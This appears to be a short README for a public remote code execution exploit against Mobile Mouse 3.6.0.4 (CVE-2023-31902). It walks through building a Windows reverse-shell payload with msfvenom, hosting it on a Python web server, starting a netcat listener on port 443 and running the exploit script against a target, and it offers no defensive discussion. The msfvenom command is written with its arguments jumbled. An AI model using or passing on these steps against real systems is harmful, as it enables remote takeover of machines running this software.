#Mobile-Mouse-3.6.0.4-RCE Remote Code Execution Exploit for Mobile Mouse 3.6.0.4

CVE-2023-31902

The only thing you need to alter if the payload doesn't function is the download payload method (if the file already exists, it might not upload the second time).

1. Make a reverse.exe by using the command "msfvenom -p windows/x64/shell_reverse_tcp." LPORT=443, LHOST=192.168.45.160, exe -f, reverse.exe

2. use python3 -m http.server 8080 to launch the Python server at port 8080.

3. rlwrap nc -nvlp 443 --> start listener at 443

4. Launch the exploit.py file by typing python3 exploit.py --target $IP --lhost $IP --file reverse.exe.

5. Give it some time; it takes two to five minutes.


